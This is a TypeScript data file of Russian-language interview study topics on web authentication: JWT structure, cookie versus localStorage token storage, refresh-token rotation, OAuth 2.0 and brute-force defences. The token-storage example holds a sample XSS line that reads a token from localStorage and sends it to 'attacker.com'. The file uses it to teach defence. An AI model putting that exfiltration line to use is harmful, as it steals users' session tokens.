import { Topic } from '../../../types';

export const SECURITY_AUTHENTICATION_INTERMEDIATE_TOPICS: Topic[] = [
  {
    id: 'auth-jwt-structure',
    title: 'JWT структура (header.payload.signature)',
    description: 'JWT состоит из трех частей, разделенных точками: header (заголовок), payload (полезная нагрузка) и signature (подпись). Понимание структуры критично для безопасной работы с JWT.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'authentication', 'jwt', 'structure', 'front-end-essential'],
    keyPoints: [
      'Header: тип токена (JWT) и алгоритм подписи (HS256, RS256 и т.д.).',
      'Payload: данные о пользователе (claims) — userId, role, exp, iat и т.д.',
      'Signature: HMAC или RSA подпись для проверки целостности.',
      'JWT кодируется в base64url (не base64!).',
      'JWT не зашифрован, только подписан — можно прочитать, но нельзя изменить.'
    ],
    examples: [
      {
        title: 'Детальная структура JWT',
        code: `// JWT: header.payload.signature

// 1. Header (base64url encoded)
{
  "alg": "HS256",  // Алгоритм подписи
  "typ": "JWT"     // Тип токена
}
// → eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

// 2. Payload (base64url encoded)
{
  "sub": "1234567890",        // Subject (user ID)
  "name": "John Doe",          // Имя пользователя
  "iat": 1516239022,           // Issued at (когда выдан)
  "exp": 1516242622            // Expiration (когда истекает)
}
// → eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ

// 3. Signature
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
// → SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

// Полный JWT:
// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
      },
      {
        title: 'Чтение JWT на клиенте',
        code: `// JWT можно прочитать (не зашифрован!)
function parseJWT(token: string) {
  const base64Url = token.split('.')[1];
  const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
  const jsonPayload = decodeURIComponent(
    atob(base64)
      .split('')
      .map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
      .join('')
  );
  return JSON.parse(jsonPayload);
}

const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';
const payload = parseJWT(token);
console.log(payload);
// { sub: "1234567890", name: "John Doe", iat: 1516239022, exp: 1516242622 }

// ⚠️ Важно: можно прочитать, но нельзя изменить!
// Изменение payload приведет к невалидной подписи`
      }
    ],
    relatedTopics: ['auth-jwt-basics', 'auth-token-storage', 'cookies-token-storage']
  },
  {
    id: 'auth-token-storage',
    title: 'Хранение токенов (cookies vs localStorage) — критично для собеседований!',
    description: 'Хранение токенов — одна из самых частых тем на собеседованиях. HttpOnly cookies предпочтительны для токенов, так как они защищены от XSS. localStorage уязвим для XSS атак.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'authentication', 'tokens', 'storage', 'cookies', 'localstorage', 'front-end-essential'],
    keyPoints: [
      'HttpOnly cookies — самый безопасный способ хранения токенов.',
      'localStorage уязвим для XSS: "безопасен, если нет XSS" — циклическая зависимость!',
      'Проблема XSS + localStorage: злоумышленник может украсть токен.',
      'Практика: "Куда и как сохранить JWT токен после логина?"',
      'Рекомендуется: HttpOnly cookie с Secure и SameSite.'
    ],
    examples: [
      {
        title: 'Проблема XSS + localStorage с токенами',
        code: `// ❌ НЕПРАВИЛЬНО: localStorage для токенов
localStorage.setItem('token', jwtToken);

// Проблема: XSS атака может украсть токен
// Злоумышленник внедряет:
const token = localStorage.getItem('token');
fetch('https://attacker.com/steal?token=' + token);

// Циклическая зависимость:
// "localStorage безопасен, если нет XSS"
// НО: если есть XSS, токен украден!
// Если нет XSS, зачем защита?

// ✅ ПРАВИЛЬНО: HttpOnly cookie
res.cookie('accessToken', jwtToken, {
  httpOnly: true,    // Недоступен через JavaScript
  secure: true,      // Только HTTPS
  sameSite: 'lax'    // Защита от CSRF
});

// XSS не может прочитать HttpOnly cookie:
// document.cookie не содержит HttpOnly cookie ✅`
      },
      {
        title: 'Практика: "Куда и как сохранить JWT токен после логина?"',
        code: `// ✅ РЕКОМЕНДУЕМЫЙ ответ:

// 1. HttpOnly cookie (предпочтительно)
res.cookie('accessToken', jwtToken, {
  httpOnly: true,    // Защита от XSS
  secure: true,      // Только HTTPS
  sameSite: 'lax',   // Защита от CSRF
  maxAge: 3600000    // 1 час
});

// На клиенте:
// Токен автоматически отправляется с запросами
fetch('/api/data', {
  credentials: 'include' // Отправляет cookie
});

// 2. Memory storage (альтернатива, если нужен доступ через JS)
let accessToken: string | null = null;

async function login(username: string, password: string) {
  const response = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ username, password })
  });
  const { token } = await response.json();
  accessToken = token; // В памяти, не в localStorage!
}

// Использование:
fetch('/api/data', {
  headers: {
    'Authorization': \`Bearer \${accessToken}\`
  }
});

// ❌ НЕ использовать localStorage для токенов!
// localStorage.setItem('token', token); // Уязвимо для XSS!`
      }
    ],
    relatedTopics: ['auth-jwt-structure', 'cookies-token-storage', 'data-storage-basics']
  },
  {
    id: 'auth-refresh-tokens',
    title: 'Refresh tokens и refresh token rotation',
    description: 'Refresh tokens используются для получения новых access tokens без повторного логина. Refresh token rotation — это практика выдачи нового refresh token при каждом обновлении access token для повышения безопасности.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'authentication', 'refresh-tokens', 'rotation', 'front-end-essential'],
    keyPoints: [
      'Access token: короткоживущий (15-60 минут), используется для запросов.',
      'Refresh token: долгоживущий (7-30 дней), используется для обновления access token.',
      'Refresh token rotation: при обновлении выдается новый refresh token, старый отзывается.',
      'Защита от replay атак: если refresh token украден, он может быть использован только один раз.',
      'Refresh token должен храниться в HttpOnly cookie.'
    ],
    examples: [
      {
        title: 'Refresh token rotation',
        code: `// 1. Логин: выдача access и refresh токенов
const accessToken = generateAccessToken(user);
const refreshToken = generateRefreshToken(user);

res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 604800000 // 7 дней
});

res.json({ accessToken });

// 2. Обновление access token
app.post('/api/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;
  
  // Проверка старого refresh token
  const user = await verifyRefreshToken(oldRefreshToken);
  if (!user) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
  
  // Отзыв старого refresh token
  await revokeRefreshToken(oldRefreshToken);
  
  // Выдача новых токенов
  const newAccessToken = generateAccessToken(user);
  const newRefreshToken = generateRefreshToken(user);
  
  // Сохранение нового refresh token
  await saveRefreshToken(user.id, newRefreshToken);
  
  res.cookie('refreshToken', newRefreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 604800000
  });
  
  res.json({ accessToken: newAccessToken });
});

// ✅ Преимущества rotation:
// - Если refresh token украден, он может быть использован только один раз
// - После использования старый токен отозван
// - Новый токен выдан, старый больше не работает`
      }
    ],
    relatedTopics: ['auth-token-storage', 'auth-jwt-structure']
  },
  {
    id: 'auth-oauth-basics',
    title: 'OAuth 2.0 основы',
    description: 'OAuth 2.0 — это протокол авторизации, который позволяет приложениям получать ограниченный доступ к ресурсам пользователя без передачи пароля. Понимание OAuth критично для работы с внешними API.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'authentication', 'oauth', 'oauth2', 'authorization', 'front-end-essential'],
    keyPoints: [
      'OAuth 2.0 позволяет приложению получить доступ к ресурсам от имени пользователя.',
      'Authorization Code flow — основной flow для веб-приложений.',
      'Client получает authorization code, обменивает на access token.',
      'Access token используется для доступа к API.',
      'OAuth не для аутентификации, а для авторизации (доступа к ресурсам).'
    ],
    examples: [
      {
        title: 'OAuth 2.0 Authorization Code flow',
        code: `// 1. Пользователь перенаправляется на OAuth провайдера
const authUrl = \`https://oauth-provider.com/authorize?
  client_id=YOUR_CLIENT_ID&
  redirect_uri=https://yourapp.com/callback&
  response_type=code&
  scope=read write\`;

window.location.href = authUrl;

// 2. Пользователь авторизуется на провайдере
// 3. Провайдер перенаправляет обратно с authorization code
// https://yourapp.com/callback?code=AUTHORIZATION_CODE

// 4. Обмен authorization code на access token
const response = await fetch('https://oauth-provider.com/token', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: authorizationCode,
    redirect_uri: 'https://yourapp.com/callback',
    client_id: 'YOUR_CLIENT_ID',
    client_secret: 'YOUR_CLIENT_SECRET' // Только на сервере!
  })
});

const { access_token, refresh_token } = await response.json();

// 5. Использование access token для доступа к API
fetch('https://api.provider.com/user', {
  headers: {
    'Authorization': \`Bearer \${access_token}\`
  }
});`
      }
    ],
    relatedTopics: ['auth-token-storage', 'auth-credentials']
  },
  {
    id: 'auth-credentials',
    title: 'Безопасная передача credentials',
    description: 'Передача credentials (пароли, токены) требует особой осторожности. Пароли никогда не должны передаваться в открытом виде, токены должны передаваться через безопасные каналы (HTTPS) и правильные заголовки.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'authentication', 'credentials', 'passwords', 'tokens', 'front-end-essential'],
    keyPoints: [
      'Пароли всегда передаются по HTTPS, никогда в открытом виде.',
      'Пароли хешируются на сервере, никогда не хранятся в открытом виде.',
      'Токены передаются в заголовке Authorization: Bearer token.',
      'Credentials не должны быть в URL (попадают в логи, history).',
      'Использовать безопасные методы передачи (POST, заголовки).'
    ],
    examples: [
      {
        title: 'Безопасная передача паролей',
        code: `// ✅ ПРАВИЛЬНО: POST запрос с HTTPS
fetch('https://api.example.com/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    username: 'user',
    password: 'password' // По HTTPS, зашифровано
  })
});

// ❌ НЕПРАВИЛЬНО: GET запрос (пароль в URL)
// fetch('https://api.example.com/login?username=user&password=password')
// Пароль попадает в логи сервера, history браузера, referer!

// ❌ НЕПРАВИЛЬНО: HTTP (не HTTPS)
// fetch('http://api.example.com/login', ...)
// Пароль передается в открытом виде, может быть перехвачен!`
      },
      {
        title: 'Безопасная передача токенов',
        code: `// ✅ ПРАВИЛЬНО: В заголовке Authorization
fetch('/api/data', {
  headers: {
    'Authorization': \`Bearer \${token}\`
  }
});

// ✅ ПРАВИЛЬНО: В HttpOnly cookie (автоматически)
fetch('/api/data', {
  credentials: 'include' // Отправляет cookie
});

// ❌ НЕПРАВИЛЬНО: В URL
// fetch('/api/data?token=abc123')
// Токен попадает в логи, history, referer!

// ❌ НЕПРАВИЛЬНО: В теле запроса (для GET)
// fetch('/api/data', { body: JSON.stringify({ token }) })
// GET запросы не должны иметь body`
      }
    ],
    relatedTopics: ['auth-token-storage', 'https-basics']
  },
  {
    id: 'auth-password-attacks',
    title: 'Атаки на пароли: брутфорс, credential stuffing, защита на клиенте',
    description: 'Атаки на пароли включают брутфорс (перебор паролей) и credential stuffing (использование украденных учетных данных). На клиенте можно реализовать rate limiting, капчу и другие меры защиты.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'authentication', 'passwords', 'bruteforce', 'credential-stuffing', 'front-end-essential'],
    keyPoints: [
      'Брутфорс: автоматический перебор паролей до нахождения правильного.',
      'Credential stuffing: использование украденных учетных данных с других сайтов.',
      'Защита на клиенте: rate limiting, капча, блокировка после нескольких попыток.',
      'Реальная защита должна быть на сервере (клиентская только для UX).',
      'Использование сильных паролей и двухфакторной аутентификации.'
    ],
    examples: [
      {
        title: 'Защита от брутфорса на клиенте',
        code: `// Rate limiting на клиенте (только для UX, не защита!)
let loginAttempts = 0;
const MAX_ATTEMPTS = 5;
const LOCKOUT_TIME = 15 * 60 * 1000; // 15 минут

async function login(username: string, password: string) {
  // Проверка блокировки
  const lockoutUntil = localStorage.getItem('lockoutUntil');
  if (lockoutUntil && Date.now() < parseInt(lockoutUntil)) {
    throw new Error('Account temporarily locked. Try again later.');
  }
  
  try {
    const response = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ username, password })
    });
    
    if (response.ok) {
      loginAttempts = 0;
      localStorage.removeItem('lockoutUntil');
      return await response.json();
    } else {
      loginAttempts++;
      
      if (loginAttempts >= MAX_ATTEMPTS) {
        const lockoutUntil = Date.now() + LOCKOUT_TIME;
        localStorage.setItem('lockoutUntil', lockoutUntil.toString());
        throw new Error('Too many failed attempts. Account locked for 15 minutes.');
      }
      
      throw new Error('Invalid credentials');
    }
  } catch (error) {
    throw error;
  }
}

// Капча после нескольких попыток
if (loginAttempts >= 3) {
  showCaptcha();
}

// ⚠️ Важно: это только для UX!
// Реальная защита должна быть на сервере!`
      },
      {
        title: 'Защита от credential stuffing',
        code: `// Credential stuffing: использование украденных учетных данных
// Защита: проверка на известные утечки

// На клиенте можно показать предупреждение:
async function checkPasswordBreach(password: string) {
  // Использование API для проверки (например, Have I Been Pwned)
  const hash = await sha1(password);
  const prefix = hash.substring(0, 5);
  const suffix = hash.substring(5);
  
  const response = await fetch(\`https://api.pwnedpasswords.com/range/\${prefix}\`);
  const hashes = await response.text();
  
  if (hashes.includes(suffix.toUpperCase())) {
    return true; // Пароль найден в утечках
  }
  
  return false;
}

// Предупреждение пользователю
if (await checkPasswordBreach(password)) {
  showWarning('This password has been found in data breaches. Please use a different password.');
}

// ⚠️ Важно: проверка должна быть на сервере!
// Клиентская проверка только для UX`
      }
    ],
    relatedTopics: ['auth-credentials', 'api-security-rate-limiting']
  }
];
